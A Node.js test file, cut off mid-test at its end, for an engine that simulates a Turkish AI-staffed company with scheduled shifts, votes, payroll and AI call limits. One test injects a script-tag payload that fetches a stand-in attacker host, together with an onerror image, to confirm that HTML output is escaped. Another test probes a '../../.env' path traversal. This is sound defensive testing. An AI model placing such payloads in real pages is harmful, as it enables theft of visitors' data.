import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, rm } from "node:fs/promises";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { spawn } from "node:child_process";
import { once } from "node:events";
import { DatabaseSync } from "node:sqlite";
import {
  createEngine,
  scoreStrategy,
  simulateMarket,
  priceScenarios,
  choosePrice,
  describeCustomers,
  validateNewStrategy,
  normalizeBuyers,
  scorePricing,
  nextHire,
  payrollOf,
  migrate,
  conditionFor,
  creditLimitOf,
  slugify,
  makeProductPage,
  CONDITIONS,
} from "../server/engine.js";
import { CANDIDATES, PERSONAS, STRATEGIES } from "../server/personas.js";

const date = "2026-09-09T05:00:00.000Z";
const base = {
  bootstrap: false,
  databasePath: ":memory:",
  apiKey: "",
  phaseDelayMs: 0,
  clock: () => new Date(date),
};
const secret = "test-secret-never-a-real-api-key";

function engineFor(t, options = {}) {
  const engine = createEngine({ ...base, ...options });
  t.after(() => engine.close());
  return engine;
}

async function dbFor(t) {
  const dir = await mkdtemp(join(tmpdir(), "mesai-test-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  return join(dir, "mesai.db");
}

function response(value) {
  return {
    ok: true,
    status: 200,
    json: async () => ({
      output: [
        {
          type: "message",
          content: [{ type: "output_text", text: JSON.stringify(value) }],
        },
      ],
    }),
  };
}

function aiMock(calls, tagline = "Ölçümle başlayın.") {
  return async (url, options) => {
    const body = JSON.parse(options.body);
    calls.push({ url, body, headers: options.headers });
    const system = body.input[0].content;
    const input = JSON.parse(body.input[1].content);
    if (system.includes("retrospektifini"))
      return response({
        lesson:
          "Bir pilot kazanıldı ama nakit etkisi sınırlı kaldı; kanıtı güçlendirmeden ölçek büyütülmemeli.",
        notes: Object.fromEntries(
          (input.team || []).map((member) => [
            member.id,
            `${member.role} için sonraki mesaide tek somut değişiklik.`,
          ]),
        ),
      });
    if (system.includes("iş tanımını"))
      return response({
        title: "Kurucunun istediği fizibilite dosyası",
        segment: "Kurucunun tanımladığı hedef grup",
        problem: "Kurucu bu konuda karşılaştırmalı bir ön çalışma istiyor.",
        solution: "Tek sayfalık fizibilite, senaryo tablosu ve prototip",
        hypothesis: "Konu küçük bir pilotla ölçülebilir hale gelir.",
        cost: 1200,
        price: 3000,
        base: 0.45,
      });
    const document = system.includes("Ekip görüşlerinden");
    return response(
      document
        ? {
            brief:
              "Önce kayıt dönemi ve sayaç birimi belirlenir. Eksik veriler işaretlenir. Bu bir saha ölçümü değil, pilot taslağıdır.",
            tagline,
            outreach:
              "Bu taslak gönderilmedi. Son ayda yaşanan ölçüm ve tüketim izleme sorunlarını konuşmak için görüşme planı.",
          }
        : {
            strategyId: "office",
            rationale: "İlk olarak ölçülebilir tüketim kaydını doğrulayalım.",
            risk: "Mevcut sayaç verisi eksik olabilir.",
            priority: 8,
            proposal: "Tek ofiste kapanış günlüğü hazırlayalım.",
          },
    );
  };
}

test("a rules day completes actual artifacts, assigned work, votes and clearly simulated results", async (t) => {
  const engine = engineFor(t, {
    fetchImpl: () => {
      throw new Error("Rules must not call a provider");
    },
  });
  assert.equal((await engine.run({ key: "rules-day" })).completed, true);
  const state = engine.state();
  assert.equal(state.company.day, 1);
  assert.equal(state.runtime.mode, "rules");
  assert.equal(state.runtime.callsToday, 0);
  assert.equal(state.artifacts.length, 5);
  assert.equal(
    state.tasks.filter(
      (task) => task.status === "done" && task.progress === 100,
    ).length,
    8,
  );
  assert.ok(state.decisions.length >= 3);
  assert.equal(
    state.decisions.filter((decision) => decision.status === "completed")
      .length,
    1,
  );
  assert.ok(state.decisions.every((decision) => decision.votes.length === 8));
  assert.ok(
    state.decisions.some((decision) =>
      decision.votes.some((vote) => vote.vote === "no"),
    ),
  );
  assert.match(state.experiments[0].result, /SİMÜLASYON/);
  assert.ok(
    state.agents.every((agent) => agent.memories.length === 1 && agent.xp > 0),
  );
  assert.ok(state.company.xp > 0);
  for (const artifact of state.artifacts) {
    assert.ok(artifact.content.length > 200);
    assert.match(artifact.content, /simülasyon|varsayım/i);
    assert.deepEqual(engine.artifact(artifact.id), artifact);
  }
  const html = state.artifacts.find(
    (artifact) => artifact.type === "html",
  ).content;
  assert.doesNotMatch(html, /<form\b|<iframe\b|src=["']https?:|fetch\s*\(/i);
  assert.equal(engine.artifact("../../.env"), null);
  assert.equal(state.learning, undefined);
  assert.ok(
    state.agents.every(
      (agent) => agent.bias === undefined && agent.preference === undefined,
    ),
  );
});

test("concurrent attempts and repeated durable keys cannot create duplicate days", async (t) => {
  const engine = engineFor(t);
  const results = await Promise.all([
    engine.run({ key: "same-day" }),
    engine.run({ key: "same-day" }),
  ]);
  assert.equal(results.filter((result) => result.started).length, 1);
  assert.equal((await engine.run({ key: "same-day" })).reason, "duplicate");
  assert.equal(engine.state().company.day, 1);
  assert.equal(engine.state().artifacts.length, 5);
});

test("08:00 schedule runs once per Istanbul date, including weekends and startup catch-up", async (t) => {
  let clock = new Date("2026-09-12T04:59:59Z"); // Saturday
  const engine = engineFor(t, { clock: () => clock });
  assert.equal((await engine.tick()).reason, "before_schedule");
  clock = new Date("2026-09-12T05:00:00Z"); // 08:00, the shift opens
  const opened = await engine.tick();
  assert.equal(opened.started, true);
  assert.equal(opened.completed, false, "mesai 17.00'ye kadar sürer");
  assert.equal(engine.state().runtime.status, "running");
  clock = new Date("2026-09-12T14:00:00Z"); // 17:00, the shift closes
  assert.equal((await engine.tick()).completed, true);
  assert.equal((await engine.tick()).reason, "duplicate");
  clock = new Date("2026-09-13T15:30:00Z"); // restart after the whole day is due
  assert.equal((await engine.tick()).completed, true);
  assert.equal(engine.state().company.day, 2);
  assert.equal((await engine.tick()).reason, "duplicate");
});

test("owner pause survives restart and blocks manual and scheduled days", async (t) => {
  const databasePath = await dbFor(t);
  let engine = createEngine({ ...base, databasePath });
  engine.pause(true);
  await engine.close();
  engine = engineFor(t, { databasePath });
  assert.equal(engine.state().config.autonomous, false);
  assert.equal((await engine.tick()).reason, "paused");
  assert.equal((await engine.run({ key: "paused" })).reason, "paused");
  engine.pause(false);
  assert.equal((await engine.tick()).started, true);
});

test("completed day, learned policy, memories, files and run identity survive reopening the database", async (t) => {
  const databasePath = await dbFor(t);
  let engine = createEngine({ ...base, databasePath });
  await engine.run({ key: "persistent-day" });
  const before = engine.state();
  const learning = engine.learning;
  await engine.close();
  engine = engineFor(t, { databasePath });
  assert.deepEqual(engine.state(), before);
  assert.deepEqual(engine.learning, learning);
  assert.equal(
    (await engine.run({ key: "persistent-day" })).reason,
    "duplicate",
  );
  await engine.run({ key: "next-day" });
  assert.equal(engine.state().company.day, 2);
  assert.ok(
    engine.state().agents.every((agent) => agent.memories.length === 2),
  );
  assert.deepEqual(
    engine.artifact(before.artifacts[0].id),
    before.artifacts[0],
  );
});

test("experience changes the ranking: failed strategies lose priority and successful alternatives rise", () => {
  const state = { company: { cash: 25000 }, learning: {} };
  const rank = (s) =>
    [...STRATEGIES].sort((a, b) => scoreStrategy(b, s) - scoreStrategy(a, s));
  const first = rank(state)[0];
  const alternative = STRATEGIES.find((strategy) => strategy.id !== first.id);
  const experienced = {
    ...state,
    learning: {
      [first.id]: { successes: 0, failures: 20, attempts: 20 },
      [alternative.id]: { successes: 20, failures: 0, attempts: 20 },
    },
  };
  assert.ok(scoreStrategy(first, experienced) < scoreStrategy(first, state));
  assert.ok(
    scoreStrategy(alternative, experienced) > scoreStrategy(alternative, state),
  );
  assert.equal(rank(experienced)[0].id, alternative.id);
});

test("market model is reproducible, can fail and reconciles simulated revenue and cost", () => {
  const input = {
    strategy: STRATEGIES[0],
    budget: 900,
    day: 1,
    reputation: 50,
    seed: "stable-seed",
  };
  assert.deepEqual(simulateMarket(input), simulateMarket(input));
  const results = Array.from({ length: 50 }, (_, i) =>
    simulateMarket({ ...input, seed: `outcome-${i}` }),
  );
  assert.ok(results.some((result) => result.success));
  assert.ok(results.some((result) => !result.success));
  for (const result of results) {
    assert.equal(result.simulated, true);
    assert.equal(result.profit, result.revenue - result.cost);
    assert.equal(result.revenue, result.customers * input.strategy.price);
  }
});

test("bootstrap never incurs AI calls or claims LLM execution even when a key is configured", async (t) => {
  let calls = 0;
  const engine = engineFor(t, {
    bootstrap: true,
    apiKey: secret,
    fetchImpl: () => {
      calls++;
      throw new Error("Unexpected call");
    },
  });
  await engine.ready;
  assert.equal(calls, 0);
  assert.equal(engine.state().runtime.mode, "rules");
  assert.match(
    engine.state().events.find((event) => event.type === "complete").message,
    /kurallar motoru/,
  );
});

test("AI council uses role-specific prompts, structured Responses output and prior memories", async (t) => {
  const calls = [];
  const engine = engineFor(t, {
    apiKey: secret,
    dailyCallLimit: 24,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "ai-1" });
  // 8 council seats, the document, the retrospective and — when a line opens — the launch page
  assert.ok(calls.length === 10 || calls.length === 11, `beklenmeyen çağrı: ${calls.length}`);
  const first = calls.length;
  assert.equal(engine.state().runtime.mode, "ai");
  const council = calls.slice(0, 8);
  assert.equal(
    new Set(council.map((call) => call.body.input[0].content)).size,
    8,
  );
  for (const call of calls) {
    assert.equal(call.url, "https://api.openai.com/v1/responses");
    assert.equal(call.body.store, false);
    assert.equal(call.body.tools, undefined);
    assert.equal(call.headers.Authorization, `Bearer ${secret}`);
  }
  await engine.run({ key: "ai-2" });
  const secondCouncil = calls.slice(first, first + 8);
  assert.ok(
    secondCouncil.every(
      (call) => JSON.parse(call.body.input[1].content).memories.length > 0,
    ),
  );
  assert.ok(
    secondCouncil.every(
      (call) =>
        Object.keys(JSON.parse(call.body.input[1].content).learning).length > 0,
    ),
  );
  assert.doesNotMatch(JSON.stringify(engine.state()), new RegExp(secret));
});

test("daily AI cap persists across restart and all excess work falls back without further requests", async (t) => {
  const databasePath = await dbFor(t);
  const calls = [];
  let engine = createEngine({
    ...base,
    databasePath,
    apiKey: secret,
    dailyCallLimit: 2,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "capped-1" });
  assert.equal(calls.length, 2);
  assert.equal(engine.state().runtime.callsToday, 2);
  assert.match(engine.state().runtime.error, /sınır/);
  await engine.close();
  engine = engineFor(t, {
    databasePath,
    apiKey: secret,
    dailyCallLimit: 2,
    fetchImpl: aiMock(calls),
  });
  await engine.run({ key: "capped-2" });
  assert.equal(calls.length, 2);
  assert.equal(engine.state().runtime.mode, "rules");
  assert.ok(engine.state().artifacts.length >= 8);
});

test("provider failures fall back visibly without leaking provider errors or keys", async (t) => {
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: async () => {
      throw new Error(`Provider rejected ${secret}`);
    },
  });
  await engine.run({ key: "failed-provider" });
  const state = engine.state();
  assert.equal(state.runtime.mode, "rules");
  assert.match(state.runtime.error, /kurallar motoru/);
  assert.doesNotMatch(JSON.stringify(state), /test-secret|Provider rejected/);
  assert.equal(state.artifacts.length, 5);
});

test("valid JSON without required council or document fields is not counted as successful AI work", async (t) => {
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: async () => response({ unrelated: true }),
  });
  await engine.run({ key: "invalid-shape" });
  assert.equal(engine.state().runtime.mode, "rules");
  assert.match(engine.state().runtime.error, /kurallar motoru/);
});

test("AI text cannot inject script elements into generated HTML", async (t) => {
  const calls = [];
  const malicious =
    '<script>fetch("https://attacker.invalid/steal")</script><img src=x onerror=alert(1)>';
  const engine = engineFor(t, {
    apiKey: secret,
    fetchImpl: aiMock(calls, malicious),
  });
  await engine.run({ key: "escaping" });
  const html = engine
    .state()
    .artifacts.find((artifact) => artifact.type === "html").content;
  assert.ok(html.includes("&lt;script&gt;"));
  assert.doesNotMatch(html, /<script>fetch|<img src=x/);
});

test(
  "process crash after a market checkpoint resumes without duplicate money, files or experiments",
  { timeout: 15000 },
  async (t) => {
    const databasePath = await dbFor(t);
    const engineUrl = new URL("../server/engine.js", import.meta.url).href;
    const source = `
    import { createEngine } from ${JSON.stringify(engineUrl)};
    const engine = createEngine({databasePath:${JSON.stringify(databasePath)},bootstrap:false,apiKey:'',phaseDelayMs:150,clock:()=>new Date(${JSON.stringify(date)})});
    const timer = setInterval(()=>{const state=engine.state();if(state.experiments.length===1 && state.history.length===1){clearInterval(timer);process.send(state);}},2);
    engine.run({key:'crash-day'}).catch(error=>{console.error(error);process.exitCode=1;});
  `;
    const child = spawn(
      process.execPath,
      ["--input-type=module", "-e", source],
      { stdio: ["ignore", "ignore", "pipe", "ipc"] },
    );
    t.after(() => {
      if (child.exitCode === null) child.kill("SIGKILL");
    });
    let errorText = "";
    child.stderr.on("data", (chunk) => {
      errorText += chunk;
    });
    const checkpoint = await new Promise((resolve, reject) => {
      child.once("message", resolve);
      child.once("exit", (code) =>
        reject(
          new Error(`Child exited before checkpoint (${code}): ${errorText}`),
        ),
      );
    });
    const exited = once(child, "exit");
    child.kill("SIGKILL");
    await exited;
    const engine = engineFor(t, {
      databasePath,
      clock: () => new Date("2026-09-09T05:10:00Z"),
    });
    assert.equal((await engine.tick()).completed, true);
    const recovered = engine.state();
    assert.equal(recovered.company.day, 1);
    assert.equal(recovered.company.cash, checkpoint.company.cash);
    assert.equal(recovered.company.revenue, checkpoint.company.revenue);
    assert.equal(recovered.company.customers, checkpoint.company.customers);
    assert.equal(recovered.experiments.length, 1);
    assert.equal(recovered.artifacts.length, 5);
    assert.equal(recovered.history.length, 2);
    assert.ok(recovered.agents.every((agent) => agent.memories.length === 1));
    assert.equal((await engine.run({ key: "crash-day" })).reason, "duplicate");
  },
);

test("the shift pays salaries, books retainer revenue and reconciles the simulated cash", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  const before = engine.state().company;
  await engine.run({ key: "payroll-1" });
  const after = engine.state().company;
  const experiment = engine.state().experiments[0];
  assert.equal(after.payroll, payrollOf(PERSONAS));
  assert.equal(after.headcount, PERSONAS.length);
  assert.ok(after.payroll > 0);
  // day one has no customers yet, so the retainer line must still be zero
  assert.equal(after.recurring, 0);
  assert.equal(
    after.cash,
    round(before.cash - experimentCost(experiment) + soldRevenue(after, before) - after.payroll),
  );
  await engine.run({ key: "payroll-2" });
  const second = engine.state().company;
  assert.equal(second.recurring, after.customers * 180);
  assert.match(engine.state().events.find((e) => e.type === "finance").message, /Bordro/);
});

const round = (n) => Math.round(n * 100) / 100;
const experimentCost = (experiment) =>
  Number(/deney gideri (\d+) TL/.exec(experiment.result)[1]);
const soldRevenue = (after, before) => after.revenue - before.revenue;

test("levelling up raises the salary, changes the title and is announced", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  for (let day = 1; day <= 5; day++) await engine.run({ key: `raise-${day}` });
  const state = engine.state();
  const founders = state.agents.filter((a) => a.founder);
  const grown = founders.filter((a) => a.salary > a.startSalary);
  assert.equal(grown.length, founders.length);
  assert.ok(grown.every((a) => a.level >= 2 && a.title !== "Uzman"));
  assert.equal(state.company.payroll, payrollOf(state.agents));
  assert.ok(state.events.some((e) => e.type === "raise"));
  assert.ok(state.achievements.find((a) => a.id === "raise").unlocked);
});

test("hiring requires runway, reputation and a gap between hires", () => {
  const rich = {
    company: { cash: 500000, reputation: 70 },
    agents: PERSONAS.map((p) => ({ ...p })),
    hiring: { hired: [], lastHireDay: 0 },
  };
  assert.ok(nextHire(rich, 4));
  assert.equal(nextHire({ ...rich, company: { cash: 1000, reputation: 70 } }, 4), null);
  assert.equal(nextHire({ ...rich, company: { cash: 500000, reputation: 40 } }, 4), null);
  assert.equal(nextHire({ ...rich, hiring: { hired: [], lastHireDay: 3 } }, 4), null);
  const everyone = {
    ...rich,
    hiring: { hired: CANDIDATES.map((c) => c.id), lastHireDay: 0 },
  };
  assert.equal(nextHire(everyone, 9), null);
});

test("a new employee joins with a downloadable posting, real work and a vote", async (t) => {
  const databasePath = await dbFor(t);
  const options = { fetchImpl: () => { throw new Error("no ai"); } };
  let engine = createEngine({ ...base, ...options, databasePath });
  await engine.run({ key: "hire-1" });
  await engine.close();
  const db = new DatabaseSync(databasePath);
  const snapshot = JSON.parse(db.prepare("SELECT data FROM snapshots WHERE id=1").get().data);
  snapshot.company.cash = 400000;
  snapshot.company.reputation = 70;
  snapshot.company.day = 3;
  db.prepare("UPDATE snapshots SET data=? WHERE id=1").run(JSON.stringify(snapshot));
  db.close();
  engine = engineFor(t, { ...options, databasePath });
  await engine.run({ key: "hire-2" });
  const hiredState = engine.state();
  assert.equal(hiredState.agents.length, PERSONAS.length + 1);
  assert.equal(hiredState.company.headcount, PERSONAS.length + 1);
  const hire = hiredState.agents.at(-1);
  assert.ok(CANDIDATES.some((c) => c.id === hire.id));
  assert.equal(hire.founder, false);
  assert.ok(hire.salary > 0 && hire.title === "Uzman");
  assert.equal(hiredState.company.payroll, payrollOf(hiredState.agents));
  const posting = hiredState.artifacts.find((a) => a.title.includes("iş ilanı"));
  assert.ok(posting && posting.content.includes("başvuru alınmaz"));
  assert.ok(engine.artifact(posting.id));
  assert.ok(hiredState.events.some((e) => e.type === "hiring"));
  assert.ok(hiredState.achievements.find((a) => a.id === "hire").unlocked);
  await engine.run({ key: "hire-3" });
  const next = engine.state();
  assert.ok(next.tasks.some((task) => task.ownerId === hire.id && task.status === "done"));
  assert.ok(next.decisions[0].votes.some((v) => v.agentId === hire.id));
  assert.equal(next.decisions[0].votes.length, PERSONAS.length + 1);
});

test("an owner brief becomes the selected work of that shift and stays labelled", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  await engine.run({ key: "brief-1", brief: "Şarj istasyonları için dinamik fiyatlama fizibilitesi" });
  const state = engine.state();
  const decision = state.decisions.find((d) => d.status === "completed");
  assert.match(decision.title, /dinamik fiyatlama/i);
  assert.equal(decision.category, "owner");
  assert.ok(state.events.some((e) => e.type === "commission"));
  assert.ok(state.artifacts.some((a) => a.content.includes("dinamik fiyatlama")));
});

test("every role writes its own lesson instead of one shared sentence", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  await engine.run({ key: "memory-1" });
  const lessons = engine.state().agents.map((a) => a.memories[0].lesson);
  assert.equal(lessons.length, PERSONAS.length);
  assert.ok(new Set(lessons).size >= 6);
  assert.ok(lessons.every((lesson) => /\d/.test(lesson)));
});

test("a strategy that just ran loses priority so the company does not repeat itself", () => {
  const state = { company: { cash: 60000 }, learning: {} };
  const top = [...STRATEGIES].sort((a, b) => scoreStrategy(b, state) - scoreStrategy(a, state))[0];
  const tired = { ...state, learning: { recent: [top.id] } };
  assert.ok(scoreStrategy(top, tired) < scoreStrategy(top, state) - 3);
  assert.notEqual(
    [...STRATEGIES].sort((a, b) => scoreStrategy(b, tired) - scoreStrategy(a, tired))[0].id,
    top.id,
  );
});

test("an older snapshot without the payroll layer is migrated instead of crashing", () => {
  const legacy = {
    company: { name: "MESAI Labs", day: 3, cash: 30000, reputation: 56, morale: 80 },
    agents: PERSONAS.map(({ salary, duty, dutyType, ...rest }) => ({ ...rest, level: 2, memories: [] })),
    achievements: [{ id: "first", title: "İlk mesai", description: "", unlocked: true }],
  };
  const migrated = migrate(legacy);
  assert.equal(migrated.agents.length, PERSONAS.length);
  assert.ok(migrated.agents.every((a) => a.salary > 0 && a.duty && a.title));
  assert.equal(migrated.company.payroll, payrollOf(migrated.agents));
  assert.equal(migrated.company.headcount, PERSONAS.length);
  assert.ok(migrated.achievements.some((a) => a.id === "dreamteam"));
  assert.ok(migrated.hiring.hired.length === 0);
});

test("the retrospective lesson replaces the provisional one everywhere it is shown", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  await engine.run({ key: "lesson-1" });
  const state = engine.state();
  const experiment = state.experiments[0];
  const decision = state.decisions.find((d) => d.status === "completed");
  assert.doesNotMatch(experiment.lesson, /Retrospektif bekleniyor/);
  assert.match(experiment.lesson, /\d/);
  assert.match(decision.result, /Ders:/);
  assert.ok(experiment.lesson.length > 40);
});

test("the day ends with a profit and loss report the observer can download", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  await engine.run({ key: "report-1" });
  const state = engine.state();
  const report = state.artifacts.find((a) => a.title.includes("gün sonu raporu"));
  assert.ok(report, "gün sonu raporu üretilmeli");
  assert.equal(report.type, "markdown");
  for (const line of ["Pilot geliri", "Bakım geliri", "Bordro", "Net", "Kasa"])
    assert.match(report.content, new RegExp(line));
  assert.ok(engine.artifact(report.id));
  const entry = state.ledger[0];
  assert.equal(entry.day, state.company.day);
  assert.equal(
    entry.net,
    Math.round(
      (entry.pilotRevenue + entry.retainer - entry.experimentCost - entry.payroll) * 100,
    ) / 100,
  );
  assert.equal(entry.headcount, state.agents.length);
  assert.ok(entry.focus);
});

test("the company can change what it does when a different area wins", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  const first = engine.state().company.focus;
  assert.ok(first);
  for (let day = 1; day <= 4; day++) await engine.run({ key: `pivot-${day}` });
  const state = engine.state();
  assert.ok(state.company.focus);
  assert.ok(state.ledger.length >= 4);
  // the ledger keeps whichever focus each day was run under
  assert.ok(state.ledger.every((entry) => entry.focus && entry.work));
});

test("visitor work is capped per fingerprint and never touches the company", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  await engine.run({ key: "visitor-day" });
  const before = engine.state();
  const first = await engine.visitorTask({
    brief: "Depoda sayım süresini kısaltmak için ne denemeliyim",
    ip: "203.0.113.7",
  });
  assert.ok(first.work);
  assert.equal(first.work.mode, "rules");
  assert.ok(first.work.deliverable.length > 200);
  assert.equal(first.work.notes.length, 3);
  const second = await engine.visitorTask({
    brief: "Aynı ziyaretçi ikinci kez deniyor burada",
    ip: "203.0.113.7",
  });
  assert.equal(second.error, "quota");
  const other = await engine.visitorTask({
    brief: "Başka bir ziyaretçi başka bir iş yazıyor",
    ip: "203.0.113.8",
  });
  assert.ok(other.work);
  assert.equal(engine.visitorStatus("203.0.113.7").remaining, 0);
  assert.equal(engine.visitorStatus("203.0.113.9").remaining, 1);
  const after = engine.state();
  assert.equal(after.company.day, before.company.day);
  assert.equal(after.company.cash, before.company.cash);
  assert.equal(after.artifacts.length, before.artifacts.length);
  assert.equal(after.community.visitorWorksToday, 2);
  // rules mode output is private: the public feed only carries model written text
  assert.equal(engine.visitorFeed().length, 0);
  assert.equal(engine.visitorWork(first.work.id).id, first.work.id);
  const tooShort = await engine.visitorTask({ brief: "kısa", ip: "203.0.113.10" });
  assert.equal(tooShort.error, "short");
});

test("visitor answers always carry the real employees, never invented ones", async (t) => {
  const engine = engineFor(t, {
    apiKey: "test-secret-not-real",
    fetchImpl: async () => ({
      ok: true,
      status: 200,
      json: async () => ({
        usage: { input_tokens: 300, output_tokens: 200 },
        output: [
          {
            type: "message",
            content: [
              {
                type: "output_text",
                text: JSON.stringify({
                  ok: true,
                  title: "Bekleme süresini kısaltma planı",
                  summary: "İki haftalık ölçümle tek değişkenli bir deneme.",
                  notes: [
                    { role: "Ayşe · Uydurma Rol", note: "Sipariş sürelerini kaydet." },
                    { role: "Murat · Uydurma Rol", note: "Hazırlık listesi çıkar." },
                    { role: "Elif · Uydurma Rol", note: "Girişte bekleyeni say." },
                  ],
                  deliverable:
                    "# Plan\n\nBu bir simülasyon çıktısıdır. Bir hafta ölçüm al, tek değişken değiştir, başarı ölçütünü sayıyla yaz ve iki hafta sonunda devam veya durdurma kararı ver. Ölçüt karşılanmazsa kapsamı büyütme.",
                }),
              },
            ],
          },
        ],
      }),
    }),
  });
  await engine.run({ key: "voices-1" });
  const roster = engine.state().agents.map((a) => `${a.name} · ${a.role}`);
  const result = await engine.visitorTask({
    brief: "Akşam vardiyasında bekleme süresini kısaltmak istiyorum",
    ip: "198.51.100.4",
  });
  assert.equal(result.work.mode, "ai");
  assert.equal(result.work.notes.length, 3);
  for (const note of result.work.notes) {
    assert.ok(roster.includes(note.role), `${note.role} kadroda olmalı`);
    assert.ok(note.note.length > 5);
  }
  assert.doesNotMatch(JSON.stringify(result.work.notes), /Uydurma Rol/);
  assert.equal(engine.visitorFeed().length, 1);
});

test("a scheduled shift walks the clock from 08.00 to 17.00 and mails at each step", async (t) => {
  let clock = new Date("2026-09-14T05:00:00Z"); // 08:00 Istanbul
  const dir = await mkdtemp(join(tmpdir(), "mesai-shift-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const databasePath = join(dir, "shift.db");
  const sent = [];
  const engine = engineFor(t, {
    databasePath,
    clock: () => clock,
    resendKey: "test-resend-key",
    fetchImpl: async (url, options) => {
      if (String(url).includes("resend")) {
        sent.push(JSON.parse(options.body));
        return { ok: true, status: 200, json: async () => ({}) };
      }
      throw new Error("no ai");
    },
  });
  const db = new DatabaseSync(databasePath);
  db.prepare(
    "INSERT INTO subscribers(email,token,status,created_at,confirmed_at) VALUES('okur@example.com','tok','confirmed',?,?)",
  ).run(clock.toISOString(), clock.toISOString());
  db.close();

  assert.equal((await engine.tick()).completed, false);
  assert.match(engine.state().runtime.phase, /08\.00/);
  // the first shift of a company opens with its founding story
  assert.equal(sent.length, 1, "08.00'da kuruluş hikayesi gider");
  assert.match(sent[0][0].subject, /birinci mesai/);

  clock = new Date("2026-09-14T05:15:00Z"); // 08:15 daily
  assert.equal((await engine.tick()).completed, false);
  assert.match(engine.state().runtime.phase, /toplantı/);
  assert.equal(sent.length, 2);
  assert.match(sent[1][0].subject, /bugünün planı/);
  assert.match(sent[1][0].html, /Günlük toplantıda/);
  assert.ok(engine.state().events.some((e) => e.type === "daily"));
  assert.ok(engine.state().events.some((e) => e.type === "plan"));

  clock = new Date("2026-09-14T08:00:00Z"); // 11:00 board
  assert.equal((await engine.tick()).completed, false);
  assert.equal(sent.length, 3);
  assert.match(sent[2][0].subject, /karar verildi/);
  assert.equal(engine.state().decisions.length > 0, true);

  clock = new Date("2026-09-14T10:30:00Z"); // 13:30 production
  assert.equal((await engine.tick()).completed, false);
  assert.equal(engine.state().artifacts.length, 4);

  clock = new Date("2026-09-14T14:00:00Z"); // 17:00 close
  assert.equal((await engine.tick()).completed, true);
  assert.equal(sent.length, 4);
  assert.match(sent[3][0].subject, /mesai bitti/);
  assert.equal(engine.state().artifacts.length, 5);
  assert.equal(engine.state().runtime.status, "idle");
  // the same day never mails twice, even if the shift is re-entered
  assert.equal((await engine.tick()).reason, "duplicate");
  assert.equal(sent.length, 4);
  // both halves of the day are archived for the site
  const archive = engine.reportList();
  assert.equal(archive.length, 1);
  assert.equal(archive[0].day, 1);
  assert.equal(archive[0].closed, true);
  const detail = engine.reportDay(1);
  assert.ok(detail.plan.length > 0, "sabah planı arşivde");
  assert.match(detail.report, /gün sonu raporu/);
  assert.ok(detail.summary.work.length > 0);
});

test("a reset closes the company and re-opens it on the chosen morning", async (t) => {
  let clock = new Date("2026-09-14T10:00:00Z");
  const dir = await mkdtemp(join(tmpdir(), "mesai-reset-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const databasePath = join(dir, "reset.db");
  const engine = engineFor(t, {
    databasePath,
    clock: () => clock,
    bootstrap: true,
  });
  await engine.ready;
  assert.ok(engine.state().company.day >= 1);
  const after = engine.reset({ startDate: "2026-09-16" });
  assert.equal(after.company.day, 0);
  assert.equal(after.config.startDate, "2026-09-16");
  assert.equal(after.artifacts.length, 0);
  assert.equal(after.decisions.length, 0);
  assert.match(after.runtime.nextRunAt, /^2026-09-16T05:00/);
  // the day before the opening nothing runs, not even the bootstrap shift
  clock = new Date("2026-09-15T09:00:00Z");
  assert.equal((await engine.tick()).reason, "before_start");
  assert.equal(engine.state().company.day, 0);
  // on the opening morning the first shift starts as day one
  clock = new Date("2026-09-16T05:00:00Z");
  assert.equal((await engine.tick()).started, true);
  clock = new Date("2026-09-16T05:15:00Z");
  await engine.tick();
  const opened = engine.reportList();
  assert.equal(opened[0].day, 1);
  assert.equal(opened[0].date, "2026-09-16");
  assert.equal(opened[0].closed, false);
});

test("the world outside the company moves and the market model feels it", () => {
  const days = Array.from({ length: 40 }, (_, i) =>
    conditionFor(`2026-10-${String((i % 28) + 1).padStart(2, "0")}`),
  );
  assert.equal(conditionFor("2026-10-05").id, conditionFor("2026-10-05").id);
  assert.ok(new Set(days.map((c) => c.id)).size >= 3, "koşullar değişmeli");
  assert.ok(days.every((c) => CONDITIONS.some((x) => x.id === c.id)));
  const input = {
    strategy: STRATEGIES[0],
    budget: 900,
    day: 3,
    reputation: 50,
    seed: "weather",
  };
  const calm = simulateMarket({ ...input });
  const bad = simulateMarket({
    ...input,
    condition: CONDITIONS.find((c) => c.id === "downturn"),
  });
  assert.ok(bad.probability < calm.probability, "daralmada olasılık düşmeli");
  assert.ok(bad.cost > calm.cost, "daralmada maliyet artmalı");
  assert.equal(bad.profit, bad.revenue - bad.cost);
  const sad = simulateMarket({ ...input, morale: 40 });
  assert.ok(sad.probability < calm.probability, "moral sonucu etkilemeli");
});

test("wins become a product line, repeated losses close it and the company writes its own rules", async (t) => {
  const engine = engineFor(t, { fetchImpl: () => { throw new Error("no ai"); } });
  for (let day = 1; day <= 8; day++) await engine.run({ key: `organic-${day}` });
  const state = engine.state();
  assert.ok(Array.isArray(state.products));
  assert.ok(Array.isArray(state.principles));
  assert.ok(
    state.products.length > 0 || state.company.customers === 0,
    "kazanılan iş ürün hattına yazılmalı",
  );
  for (const product of state.products) {
    assert.ok(product.title && product.field);
    assert.ok(["active", "retired"].includes(product.status));
  }
  assert.equal(
    state.company.customers,
    state.products
      .filter((p) => p.status === "active")
      .reduce((n, p) => n + p.customers, 0),
    "müşteri sayısı ürün hatlarıyla tutmalı",
  );
  assert.ok(state.ledger.every((entry) => entry.condition));
  assert.equal(typeof state.company.roughDays, "number");
});

test("a company that runs out of runway loses the people it hired last", async (t) => {
  const databasePath = await dbFor(t);
